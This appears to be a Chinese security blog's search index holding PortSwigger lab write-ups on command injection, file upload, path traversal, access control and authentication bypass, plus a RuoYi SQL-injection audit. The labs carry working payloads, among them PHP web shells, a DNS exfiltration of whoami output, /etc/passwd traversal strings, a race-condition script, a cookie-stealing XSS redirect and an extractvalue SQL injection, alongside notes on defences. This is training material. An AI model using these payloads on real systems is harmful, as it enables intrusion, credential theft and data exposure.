sandbox=\"allow-forms\"\nsrc=\"url?email=hacker@attacker-website.com\">&lt;/iframe>\n\nB:X-Frame-Options的防御","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-操作系统命令注入","url":"/2021/08/19/PortSwigger-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","content":"命令执行\n\n什么是操作系统命令注入  操作系统命令注入(也称为外壳注射)，允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，并且通常会完全损害应用程序及其所有数据。攻击者通常可以利用操作系统命令注入漏洞来破坏托管基础设施的其他部分，利用信任关系将攻击转向组织内的其他系统。\n一些命令\n\n\n命令目的\nLinux\nWindows\n\n\n\n当前用户的名称\nwhoami\nwhoami\n\n\n操作系统\nuname -a\nver\n\n\n网络配置\nifconfig\nipconfig /all\n\n\n网络连接\nnetstat -an\nnetstat -an\n\n\n运行过程\nps -ef\ntasklist\n\n\n操作系统注入的实现\n基础payload\n\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;stockStatus?productID&#x3D;381&amp;storeID&#x3D;29 | command\n\n\n1. 通过时间盲注进行操作系统注入payload：添加ping指令\n注入点=||ping+-c+10+127.0.0.1||\n\n2. 通过重定向进行操作系统注入payload：利用whomi进行重定向\n注入点=||whoami>/var/www/images/output.txt||\n//  再通过 目录遍历攻击 添加filename参数\nfilename=output.txt\n\n\n\n3. 使用OAST进行操作系统注入payload：使用Burp Collaborator Client\n注入点=x||nslookup+burpcollaborator.net||\n\npayload\n注入点=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||\n\n\n\n\n\n\n输入Solution commit即可\n\n\n如何避免操作系统注入的漏洞\n到目前为止，防止操作系统命令注入漏洞的最有效方法是永远不要从应用层代码中调用操作系统命令。\n在很多情况下，都有使用更安全的平台API实现所需功能的替代方法。\n\n 如果使用用户提供的输入向操作系统命令发出呼叫被认为是不可避免的，则必须执行强输入验证。有效验证的一些示例包括：\n\n对准允许值的白名单进行验证。\n验证输入是一个数字。\n验证输入仅包含字母数字字符，没有其他语法或空白。\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-文件上传","url":"/2022/01/29/PortSwigger-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":"Port 文件上传\n\nPortSwigger-文件上传 FileUpload\n前言：其实也算是很早就听说了文件上传漏洞，并在一些CTF比赛中做了一些题目，再刷一遍port的吧\n\n\n  那毕竟还是看漏洞，从是什么，怎么利用，原理，绕过，防御看。\n\n0x01 什么是文件上传漏洞简单来说，文件上传漏洞，一张图就能明白了\n\n 这里的文件上传如果没有严格规定必须上传jpg，png格式。或者换句话说，在某个web开发环境当中，上传点没有做严格的要求，那么别人可以任意上传文件，轻则数据泄露，重则Web Shell。\n\nwebshell\n\n&lt;?php echo system($_GET['command']); ?>\n\n0x02 何处存在文件上传漏洞\n说这个话似乎有些搞笑了，确实我也承认，有文件上传的地方就很可能存在文件上传漏洞。\n\n但是真正的判定标准实际上是在抓包之后的。文件上传漏洞的影响通常取决于两个关键因素：\n\n网站未能正确验证文件的哪个方面，无论是其大小、类型、内容等。\n成功上载文件后，会对文件施加哪些限制。\n\n最坏的当然是对类型没有过滤，前文也说了，造成Web Shell。\n如果未正确验证文件名，则攻击者可能仅通过上传具有相同名称的文件来覆盖关键文件。\n如果先前已经对服务器进行了目录遍历，那么攻击者还可以将文件投放到很多恶意的地方。\n如果不能确保文件大小在预期的阈值内，还可能引发一种拒绝服务(DoS)攻击，攻击者会利用这种攻击填满可用磁盘空间。\n0x03 开打！文件上传漏洞1. Lab: Remote code execution via web shell upload 基础的文件上传漏洞先看一个基础的文件上传案例\n\nLab: Remote code execution via web shell upload\n\n界面长这样↓↓\n\n\n上传文件并抓包，这里我们上传恶意文件1.php文件代码内容——–&gt;获取该路径的文件内容\n&lt;? php echo file_get_contents('/home/carlos/secret') ?>\n\n查看抓包内容\n\n\n我们在burpsuite中查看发送1.php之后的样子，发现成功获取到了该路径文件的内容。\n\n\n2. Lab: Web shell upload via Content-Type restriction bypass  当服务器限制了上传类型时\n限制上传类型，也就是我们之前所说的 Content-Type\n来看配套的靶场练习：Lab: Web shell upload via Content-Type restriction bypass\n\n\n在这一种情况下我们来看一看，直接上传php恶意webshell能得到什么回显。\n\n\n\n很明显发包回显是错误，而且php脚本并未被执行，报错显示：你只能提交 Content-Type=image/jpeg的东西，其他都不行，那么咱们就依它呗，那我修改一下发送php webshell的代码，将 Content-Type修改为image/jpeg(前后顺序不可以倒过来)，然后再上传php恶意webshell，嘿嘿，就成功啦！\n\n\n\n之后再访问webshell当中的路径即可。\n\n3. Lab: Web shell upload via path traversal  当服务器设置脚本白名单时这类防御一般与上面讲到的“2. 当服务器限制了上传类型时”是同时使用的\n那么这个白名单啊，其实也不难理解。什么是黑名单呐？黑名单就是不让你通过的用户、脚本、命令等等等，那么白名单想法，是让你通过的用户、命令、脚本balabala……这类防御将一些自己写好的脚本写入白名单，那么我们在上传恶意的webshell的时候就无法对服务器产生影响了，是一种不错的防御手段。但是这类白名单的脚本通常只对上传路径有效，比如在这个靶场当中，只对上传的有效，如果我们换一个地方？爆破出某一个未加防护的网页，不就可以了吗~那这类”自己写好的脚本”啊，或许会长这样\nGET /static/exploit.php?command=id HTTP/1.1  \nHost: normal-website.com  \n  \n  \nHTTP/1.1 200 OK  \nContent-Type: text/plain  \nContent-Length: 39  \n  \n&lt;?php echo system($_GET['command']); ?>\n\n很明显，这总得出点问题吧，你这自己写了webshell，别人不打你？天理难容啊，但是说实话，这一脚本也确实起了一些关键性的作用，我们来看配套的靶场：\n\nLab: Web shell upload via path traversal\n\n\n原本我们写的webshell是\n&lt;? php echo file_get_contents('/home/carlos/secret'); ?>\n\n结果我们的这个代码(?)反而被服务器打印出来了，啊这，再思考思考。\n那么结果之前的思路，换一个地方打它。这里要用到一些目录遍历的知识\n\n正常回显，并没有什么用\n\n通过对正斜杠()字符进行URL编码来模糊目录遍历序列\n\n最终的payload：\nfilename=\"..%2fexploit.php\"\n\n终于解决啦！之前我本人在这道题目上卡了好久，是因为payload当中的全角&#x2F;半角搞混了，然后一直出不来结果。大家要注意~\n4. Lab: Web shell upload via extension blacklist bypass   当黑名单对文件的封禁效果不是完美的时候\n有时为了防止恶意的webshell文件上传，我们通常会对上传的文件进行黑名单的设置比如.php，.jsp，.html这些文件扩展名会被直接加至黑名单里面。\n但是对于.html文件我们常常可以通过.shtml来替代，.php文件可以通过.php5文件来代替，那如果服务器对这类文件没有做出严格的封禁策略时，容易被攻击。\n\n而对于这一漏洞的应用，一般都是服务器的黑名单只过滤了.php的文件，但并没有过滤.htaccess。这边简单介绍一下.htaccess的作用：\n一般.htaccess可以用来留后门和针对黑名单绕过，创建一个txt写入\nAddType application&#x2F;x-httpd-php .png\n\n打开另存为，保存类型为所有文件，可以让png解析为php，还可以把png改成其他图片格式—&gt;例如jpeg、gif等等…\n\n我们来看port的这道靶场，加强理解\nLab: Web shell upload via extension blacklist bypass\n\n直接上传shell.php，这次被挡在门外了，怀疑是被黑名单ban了，尝试黑名单有没有ban.htaccess文件。\n\n\n接着我们尝试上传.htacess类型的文件，在.htacess文件中事先编辑好payload\nAddType application/x-httpd-php .l33t\n\n这里payload的意思就是，会将.l33t后缀的文件解析成php格式的文件，那么我们发送shell.l33t的时候，就自动转换成了shell.php成功绕过了黑名单！\n上传，并修改Content-Type:Content-Typetext/plain之后再发包\n\n\n将之前的shell.php修改为shell.l33t之后再发一次包，得到答案\n5. Lab: Web shell upload via obfuscated file extension            对黑名单进行绕过—–&gt;混淆文件名说到混淆文件名的绕过，大家蛮熟悉的一种应该是SQL注入的双写绕过，以及对于waf的大小写绕过。对文件上传漏洞当中，也存在这种类似的绕过方法。\n\n常用的几种绕过方式\n\n1. 多个扩展名绕过：shell.php.php2. 尾部添加字符：shell.php.3. 使用url编码’.’，例如：shell%2Ephp4. 使用分号绕过：shell.asp;.jpg或者shell.asp%00.jpg5. 使用多字节unicode字符6. 双写绕过，shell.p.phphp，在这个payload中，.php很有可能被过滤，那么在.php被过滤之后，剩下的就是shell.php，成功上传\n我们来看这一道配套靶场\nLab: Web shell upload via obfuscated file extension\n\n日常先上传shell.php试探一手\n\n\n回显”Sorry, only JPG &amp; PNG files are allowed”，我们先尝试着使用之前的绕过方法绕过一下。\n这里尝试第一种绕过————多个扩展名绕过，filename=shell.php.jpg，再抓包看的时候发现，shell.php.jpg并没有得到想要的效果。\n\n\n再尝试其他的绕过姿势，得到最后的payload：\nfilename=\"shell.php%00.jpg\"\n\n\n\n成功上传，访问/files/avatars/&lt;YOUR-IMAGE&gt;即可\n6. Lab: Remote code execution via polyglot web shell upload  存在缺陷的文件上传更安全的服务器不是隐式信任请求中指定的内容，而是尝试验证文件的内容是否与预期内容是否实际匹配，也就是检查Content-Type是否匹配。\n对于图像上传功能，服务器可能会尝试验证图像的某些固有属性，例如其尺寸。例如，如果您尝试上传PHP脚本，则它根本不具有任何维度。因此，服务器可以推断出它不可能是图像，并相应地拒绝上传。\n同样，某些文件类型可能始终在其页眉或页脚中包含特定的字节序列。这些可以像指纹或签名一样使用，以确定内容是否与预期类型匹配。例如，JPEG文件始终以FF D8 FF字节开头。用到最常用的工具为exiftool&#x2F;exiftool: ExifTool meta information reader&#x2F;writer (github.com)\n这一道靶场：Lab: Remote code execution via polyglot web shell upload\n还是老方法，先上传一下shell.php的文件，看回显如何\n\n\nOK，回显：file is not a valid image\n我们尝试着用上文所写的方法进行绕过，这里所用到的工具为exitool，使用命令，让其自动创建一个以jpg文件FF D8 FF开头，但扩展名为.php的文件。使用命令之前要先在仓库同目录下创建一个jpg文件，再执行命令\n./exiftool -Comment=\"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\" &lt;YOUR-INPUT-IMAGE>.jpg -o polyglot.php\n\n\n\n这里的polyglot.php就是我们所需要的文件，上传即可\n\n\n在众多乱码中找到我们需要的那一个即可~！\n7. Lab: Web shell upload via race condition 通过争用条件上传webshell\n在port原文中出现了race condition这个词，计算机术语把它翻译成竞争条件&#x2F;征用条件，要想知道如何利用竞争条件执行文件上传漏洞，就要先弄懂竞争条件是什么，这里浅谈一下：\n\n竞争条件（Race Condition）：计算机运行过程中，并发、无序、大量的进程在使用有限、独占、不可抢占的资源，由于进程无限，资源有限，产生矛盾，这种矛盾称为竞争（Race）。竞争条件（Race Condition）旨在描述一个系统或者进程的输出依赖于不受控制的事件出现顺序或者出现时机。由于两个或者多个进程竞争使用不能被同时访问的资源，使得这些进程有可能因为时间上推进的先后原因而出现问题。\n\n\n在文件上传当中，当我们上传恶意的webshell的时候，有些服务器会采用沙箱的手段判断文件是否存在危害，若存在危害则删除，而从判断—-&gt;删除这中间，webshell就占用了”race condition”，也就是利用这短短的几秒钟，我们进行攻击。\n\nLab: Web shell upload via race condition\n\n照常，我们先直接上传shell文件，失败之后，报错提示”Sorry, only JPG &amp; PNG files are allowed”—–&gt;于是乎，我们将shell.php加上.jpg的扩展名，进行攻击。\n\n\n再抓取包：GET &#x2F;files&#x2F;avatars&#x2F;shell.php.jpg HTTP&#x2F;1.1\n之后，选中post请求并Send it Turbo\n\n\n使用port提供的payload：将其中的替换成自己的\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)\n\n    request1 = '''&lt;YOUR-POST-REQUEST>'''\n\n    request2 = '''&lt;YOUR-GET-REQUEST>'''\n\n    # the 'gate' argument blocks the final byte of each request until openGate is invoked\n    engine.queue(request1, gate='race1')\n    for x in range(5):\n        engine.queue(request2, gate='race1')\n\n    # wait until every 'race1' tagged request is ready\n    # then send the final byte of each request\n    # (this method is non-blocking, just like queue)\n    engine.openGate('race1')\n\n    engine.complete(timeout=60)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\n\n\n\n\n再点击最下面的Attack，就可以获取到答案了~\n0x04 文件上传漏洞与其他漏洞的配合攻击4.1 文件上传漏洞与XSS的配合如果网站允许上传.html，.jsp文件时，就可以与xss相配合攻击，类似的payload有:alert(document.cookie)\n4.2 文件上传漏洞与XXE注入配合在知道服务器解析基于XML的文件，如Microsoft Office或文件，这可能是XXE注入攻击的潜在媒介。\n4.3使用 PUT 上传文件PUT /images/exploit.php HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-httpd-php\nContent-Length: 49\n\n&lt;?php echo file_get_contents('/path/to/file'); ?>\n\n0x05 文件上传漏洞的防护\n设置白名单，对允许上传文件的扩展名进行筛选。\n确保文件名不包含任何可能被解释为目录或遍历序列的子字符串，也就是..&#x2F;这种方式的绕过，具体见靶场例子Web shell upload via path traversal。\n重命名上载的文件，以避免可能导致现有文件被覆盖的冲突。\n检查.htacess是否使用，以及是否存在被利用的可能性。\n尽可能使用已建立的框架来预处理文件上载，而不是尝试编写自己的验证机制。\n在完全验证文件之前，不要将文件上载到服务器的永久文件系统，可以事先使用沙箱进行文件检查。\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-目录遍历攻击","url":"/2021/08/17/PortSwigger-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","content":"目录遍历攻击\n\n\n1. 什么是目录遍历攻击目录遍历攻击允许攻击者在运行应用程序的服务器上读取任意文件。这可能包括应用程序代码和数据、后端系统的凭据和敏感的操作系统文件。在某些情况下，攻击者可能能够写信给服务器上的任意文件，允许他们修改应用程序数据或行为，并最终完全控制服务器。\n\n举个例子\n\n在某个界面存在此HTML语句来加载图片\n&lt; img src=\"/loadImage?filename=218.png\" >\n\n那么图像本身存储在磁盘上，要返回图像，应用程序将请求的文件名附加到此基本目录，并使用文件系统 API 来读取文件的内容。在上述情况下，应用程序从以下文件路径读取：\nloadImagefilename&#x2F;var&#x2F;www&#x2F;images&#x2F;\n\n具体到某个图片\n&#x2F;var&#x2F;www&#x2F;images&#x2F;218.png\n\n\n而攻击者使用的基本payload\n\n\nunix系统\n\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  \n\n\nWindows系统\n\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;..\\..\\..\\windows\\win.ini\n\n\n2. 一些绕过方法与payload2.1 横向序列被路径旁路阻止payload：直接引用文件而无需使用任何横向序列\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;&#x2F;etc&#x2F;passwd  \n\n2.2 横向序列剥离非递归payload：多加一个点号\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc&#x2F;passwd\n\n2.3 通过一些编码绕过输入筛选器payload：例如，使用url编码\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;..%252f..%252f..%252fetc&#x2F;passwd\n\n2.4 验证路径的开始payload：加上前面一段路径\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.\n\n2.5 文件要求以预期的文件扩展结束payload：在最后部分加上%00.png或其他扩展名\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;loadImage?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.png\n\n\n3. 目录遍历攻击的预防 防止文件路径交叉漏洞的最有效方法是避免将用户提供的输入完全传递到文件系统 API 中。许多应用程序功能可以重写，以更安全的方式提供相同的行为。\n 如果认为将用户提供的输入传递到文件系统 API 是不可避免的，则应一起使用两层防御来防止攻击：\n\n应用程序应在处理用户输入之前验证其。理想情况下，验证应与允许值的白名单进行比较。如果对于所需的功能不可能，则验证应验证输入仅包含允许的内容，如纯字母数字字符。\n验证所提供的输入后，应用程序应将输入附加到基础目录中，并使用平台文件系统 API 对路径进行规范。它应验证规范路径是否从预期的基础目录开始。\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-访问控制技术与提权","url":"/2021/09/20/PortSwigger-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%8F%90%E6%9D%83/","content":"提权漏洞\n\n什么是访问控制？——-&gt;  系统管理员控制用户对服务器、目录、文件等资源访问\nWeb中，users  ↓↓↓↓↓\n身份验证：Who are you？\n会话管理：确定用户发出的是哪些HTTP请求\n访问控制：allowed ？ —-&gt;Who\n\n0x01 访问控制1. 垂直访问控制垂直访问控制是限制其他类型用户无法访问的敏感功能的机制。\n通过垂直访问控制，不同类型的用户可以访问不同的应用程序功能。\n例如，管理员可能能够修改或删除任何用户的帐户，而普通用户无法访问这些操作。垂直访问控制可以更细化地实施旨在执行业务策略（如职责分离和特权最少）的安全模型。\n2. 水平访问控制横向访问控制是限制用户访问资源的机制，这些用户被明确允许访问这些资源。\n通过水平访问控制，不同的用户可以访问同类型资源的子集。\n例如，银行应用程序将允许用户查看交易并从自己的帐户付款，但不允许查看任何其他用户的帐户。\n3. 上下文依赖访问控制上下文的访问控制根据应用程序状态或用户与应用程序的交互，限制对功能和资源的访问。\n上下文依赖的访问控制可防止用户以错误的顺序执行操作。\n例如，零售网站可能会阻止用户在付款后修改购物车的内容。\n0x02 访问控制漏洞(提权)1. 垂直特权升级如果用户可以访问不允许访问的功能，则这是垂直特权升级。\n例如，如果非管理用户实际上可以访问管理员页面，可以删除用户帐户，那么这就是垂直特权升级，详细见身份验证专题与身份验证专题进阶\n\n1.1 未受保护的功能\n一个网站中的某些网站，用户能够直接访问到管理员权限的url\n例如：通过管理员账号密码登录能够进入\n\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;admin\n\n1.1A 对于简易的、易暴露出的url\n而普通用户可以直接访问到这个URL，则存在漏洞\n\n同样的，爆破目录，信息披露都可能被攻击者利用\n1.1B 对于复杂的url\n对于复杂的url，简单的爆破或者猜测无法得到管理员的url\n\n\n这时通常要查看script脚本\n用Burpsuite抓包后\n\n\n\n从而能够观察到泄露的url\n1.1C 绕过url的认证有时url会暴露出，但却需要认证\n\n例如，访问此网站\n\nhttps:&#x2F;&#x2F;ac1d1f881f65650480ba60cb007a0020.web-security-academy.net&#x2F;admin\n\n\n\n需要进行认证，猜测可能是因为前端设置了验证\nDENY: POST, &#x2F;admin&#x2F;deleteUser, managers\n以此来拒绝用户访问url的方法，所以通过对后端发送请求，进行绕过\npayload\nURLX-Rewrite-URL\n\nPOST / HTTP/1.1\nX-Original-URL: /admin/deleteUser\n\n\n\n\n先将X-Original-URL设置为/invalid\n\n\n\n1.2 基于GET请求，运用参数来提权例如\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;login&#x2F;home.jsp?admin&#x3D;true\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;login&#x2F;home.jsp?role&#x3D;1\n\n那么在实际应用中，得知参数的名称时，用Burpsuite抓包完后进行修改\n\n\n通过”Proxy”——&gt;”Options”——–&gt;”Match and Replace”,将false全部替换为true即可，确保每个包都能够使得Admin=true\n\n\n1.3 通过json修改数据\n存在提权点很可能在各个界面，需要自己探测\n\n\n\n修改roleid，通过传json的形式完成提权\n\n2. 水平特权升级\n水平提权的一些操作与垂直提权类似\n\n2.1 利用数据泄露时的重定向-&gt;获取用户的userid\n有些代码设计不合理时，访问某个url时会回到登录界面\n但这一种重定向，也会泄露数据\n\n\n\n2.2 利用cookies对身份认证进行绕过\n发送HTTP请求\n\n\n\n用wiener的cookie去替换carlos的cookie\n\n\n\n\n2.3 基于Reference的访问控制先抓取到一个给carlos提权的包\n\n\n若没有Reference,则报错\n\n\n接着，使用wiener的cookie去替换carlos中的cookie即可。\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-身份验证专题进阶","url":"/2021/08/04/PortSwigger-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%93%E9%A2%98%E8%BF%9B%E9%98%B6/","content":"port 身份认证进阶\n\n身份验证进阶1. 双重身份验证的绕过（即2FA）\n应用条件，当输入验证码之后，迅速重新登录\n有些网站实际上并不会检查是否完成了第二步验证码的检测。\n\n1.1 缺陷的双重身份验证逻辑例：登录之后还需要输入验证码，验证码来自邮箱。\n先使用自己的账户登录\nPOST /login-steps/first HTTP/1.1\nHost: vulnerable-website.com\n...\nusername=carlos&amp;password=qwerty\n\n然后，将为他们分配与他们的帐户相关的cookie，将其转到登录过程的第二步\nHTTP/1.1 200 OK\nSet-Cookie: account=carlos\n\nGET /login-steps/second HTTP/1.1\nCookie: account=carlos\n\n\n接着，从邮箱获取code，并登录\n\nPOST /login-steps/second HTTP/1.1\nHost: vulnerable-website.com\nCookie: account=carlos\n...\nverification-code=123456\n\n在这种情况下，攻击者可以使用自己的凭据登录，然后在提交验证码时将帐户cookie的值更改为任意用户名。\nPOST /login-steps/second HTTP/1.1\nHost: vulnerable-website.com\nCookie: account=victim-user  # 关键点就是这，如果这里是加密的就好了\n...\nverification-code=$123456$    # 对验证码进行爆破\n\n爆破使用brute forcer进行爆破\n\n\n\n\n2.其他身份验证机制中的漏洞2.1 “记住密码”记住密码这一举动往往会得到一个存储的cookie，通过这个cookie进行爆破\n\n首先使用正确的username与password登录之后，进行记住密码\n那么就会得到一个cookie，再使用受害者的账号进行爆破\n\n\n更为重要的是，留意cookie的加密方式（如base64等）\n\n2.1a “记住密码”——-&gt; 利用xss窃取cookie所用的payload\n\n先确定是否存在xss\n\n&lt;img src=1 onerror=alert(1) />\n\n\n\n再获取cookie\n\n&lt;script>document.location='所要盗取cookie的\nurl'+document.cookie&lt;/script>\n\n一般来说要尝试破解cookie的加密方式\n例如password——-&gt;md5——–&gt;base64——&gt;cookie\n2.2 重置用户密码\n2.2A 通过电子邮箱发送密码\n所用方法\n先用正确的账号密码登录，并选择忘记密码，抓到如下一个包\n\n\n\n\n\n将username修改成victim name即可\n\n2.2B 密码重置中毒\n相比2.2A 通过电子邮箱发送密码，通过点击网址来重置密码是安全性更高的方式。\n\n\n通过伪造XFH的方式，来进行攻击\n\n\n\n伪造XFH的目的是获取victim的forgot-password-token\n\n\n\n2.3 爆破式修改用户密码\n通过重新设置密码界面，由于只有一个未知量当前密码\n故对当前密码进行爆破，使用正确账号登录的cookie\n\n\n\n\n\n\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-身份验证专题","url":"/2021/08/03/PortSwigger-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%93%E9%A2%98/","content":"port 身份认证\n\n1. 基于密码登录的身份验证1.1 使用字典爆破简单的身份验证\n将username和password分开爆破即可。\n\n1.2使用Comment功能\noptions—-&gt;Grep-Extract——&gt;add\n\n手动添加到Comment\n\n\n1.3 利用xff进行爆破\n例如waf，会阻止外网对内网的爆破，所以需要伪造xff\n\n​\t\t所以要先在伪造xff的同时进行爆破，爆破步骤如上。\n\n\n\n两个payload的设置\n\n\n\n\n\n\n注意，一开始爆破username的时候，需要将密码设置的很长，为了突出response receive time。\n\n找username的时候通过response receive time\n\n\n找password直接看length\n\n2. 有缺陷的防爆破出发点：普通的爆破会被两种常见的方法阻挡\n如果远程用户的登录尝试失败太多，锁定该帐户\n如果远程用户快速连续尝试登录太多，则阻止其IP地址\n\n2.1 针对账户锁定的爆破​\t如果登录失败次数过多，则会被锁定账户\n\n选择攻击类型’cluster bomb’\n\n\n添加两个绝对引用\n\n§invalid-username§ &amp; password&#x3D;example§§\n\n\n在第二个payload中选择Null payloads,然后根据情况选择Generate payloads\n\n\n\n\n先爆破出username再爆破password\n\n\n\n\n\n2.2 针对IP阻止的爆破如果连续提交3个错误的登录，IP被阻止。 \n​\t但是，可以通过在达到限制之前登录自己的帐户来重置计数器。\n\n在Intruder中设置pitchfork\n两个payload一一对应\n\n\n\n\n\n2.3 进行速率调整爆破简单举例：在平常登录多次错误之后，会提示稍等一分钟后再重复。\n在短时间内发出太多登录请求会导致IP地址被阻止。\n所以解决的三种方式：\n\n一段时间后自动解禁\n由管理员解禁\n填写验证码后解禁\n\n\n可以确定如何通过单个请求猜测多个密码，有时也可以绕过此防御。\n\n在burpsuite中，将password编辑为json格式\n\n\n接着使用burp代理模式打开show response in browser\n","categories":["Port"],"tags":["web安全"]},{"title":"RuoYi 多版本代码审计","url":"/2022/08/31/RuoYi-%E5%A4%9A%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"RuoYi 多版本代码审计\n\nSQL 注入 RuoYi &lt;&#x3D; 4.6.1漏洞成因RuoYi &lt;&#x3D; 4.6.1 版本的 mybatis 数据库中使用了 $&#123;&#125;\n漏洞复现到系统管理 —-&gt; 用户管理界面下，存在 SQL 注入\n对应的 POST 数据包\nPOST &#x2F;system&#x2F;role&#x2F;list HTTP&#x2F;1.1\nHost: localhost\nContent-Length: 179\nPragma: no-cache\nCache-Control: no-cache\nsec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;104&quot;, &quot; Not A;Brand&quot;;v&#x3D;&quot;99&quot;, &quot;Microsoft Edge&quot;;v&#x3D;&quot;104&quot;\nAccept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01\nContent-Type: application&#x2F;x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;104.0.5112.102 Safari&#x2F;537.36 Edg&#x2F;104.0.1293.70\nsec-ch-ua-platform: &quot;Windows&quot;\nOrigin: http:&#x2F;&#x2F;localhost\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http:&#x2F;&#x2F;localhost&#x2F;system&#x2F;role\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6,ja;q&#x3D;0.5,zh-TW;q&#x3D;0.4\nCookie: Idea-3800bf0b&#x3D;ca6f81a2-cc80-4b2d-9111-1085adff8048; JSESSIONID&#x3D;ac4b0550-9f78-49a8-8bb6-bc5b58cbdda2\nConnection: close\n\npageSize&#x3D;&amp;pageNum&#x3D;&amp;orderByColumn&#x3D;&amp;isAsc&#x3D;&amp;roleName&#x3D;&amp;roleKey&#x3D;&amp;status&#x3D;&amp;params[beginTime]&#x3D;&amp;params[endTime]&#x3D;&amp;params[dataScope]&#x3D;and extractvalue(1,concat(0x7e,(select database()),0x7e))\n\n对应的字段存在 SQL 注入，payload：\npageSize&#x3D;&amp;pageNum&#x3D;&amp;orderByColumn&#x3D;&amp;isAsc&#x3D;&amp;roleName&#x3D;&amp;roleKey&#x3D;&amp;status&#x3D;&amp;params[beginTime]&#x3D;&amp;params[endTime]&#x3D;&amp;params[dataScope]&#x3D;and extractvalue(1,concat(0x7e,(select database()),0x7e))\n\n\n关于 Java SQL 注入的 Filter@Component\npublic class SqlInjectionFilter implements Filter &#123;\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException &#123;\n        HttpServletRequest req=(HttpServletRequest)servletRequest;\n        HttpServletRequest res=(HttpServletRequest)servletResponse;\n        //获得所有请求参数名\n        Enumeration params = req.getParameterNames();\n        String sql = \"\";\n        while (params.hasMoreElements()) &#123;\n            // 得到参数名\n            String name = params.nextElement().toString();\n            // 得到参数对应值\n            String[] value = req.getParameterValues(name);\n            for (int i = 0; i &lt; value.length; i++) &#123;\n                sql = sql + value[i];\n            &#125;\n        &#125;\n        if (sqlValidate(sql)) &#123;\n            throw new IOException(\"您发送请求中的参数中含有非法字符\");\n        &#125; else &#123;\n            chain.doFilter(servletRequest,servletResponse);\n        &#125;\n    &#125;\n\n    /**\n     * 关键词校验\n     * @param str\n     * @return\n     */\n    protected static boolean sqlValidate(String str) &#123;\n        // 统一转为小写\n        str = str.toLowerCase();\n        // 过滤掉的sql关键字，可以手动添加\n        String badStr = \"'|and|exec|execute|insert|select|delete|update|count|drop|*|%|chr|mid|master|truncate|\" +\n                \"char|declare|sitename|net user|xp_cmdshell|;|or|-|+|,|like'|and|exec|execute|insert|create|drop|\" +\n                \"table|from|grant|use|group_concat|column_name|\" +\n                \"information_schema.columns|table_schema|union|where|select|delete|update|order|by|count|*|\" +\n                \"chr|mid|master|truncate|char|declare|or|;|-|--|+|,|like|//|/|%|#\";\n        String[] badStrs = badStr.split(\"\\\\|\");\n        for (int i = 0; i &lt; badStrs.length; i++) &#123;\n            if (str.indexOf(badStrs[i]) >= 0) &#123;\n                return true;\n            &#125;\n        &#125;\n        return false;\n    &#125;\n&#125;\n\n漏洞修复1、SysDeptMapper.xml中的updateParentDeptStatus节点使用了$&#123;ancestors&#125;，修改相关逻辑。转成数组方式修改部门状态。\n/**\n * 修改该部门的父级部门状态\n * \n * @param dept 当前部门\n */\nprivate void updateParentDeptStatusNormal(Dept dept)\n&#123;\n\tString ancestors = dept.getAncestors();\n\tLong[] deptIds = Convert.toLongArray(ancestors);\n\tdeptMapper.updateDeptStatusNormal(deptIds);\n&#125;\n\n\n2、数据权限相关使用了$&#123;params.dataScope&#125;，DataScopeAspect.java数据过滤处理时添加clearDataScope拼接权限sql前先清空params.dataScope参数防止注入。\npublic class DataScopeAspect\n&#123;\n    ......\n\t@Before(\"dataScopePointCut()\")\n\tpublic void doBefore(JoinPoint point) throws 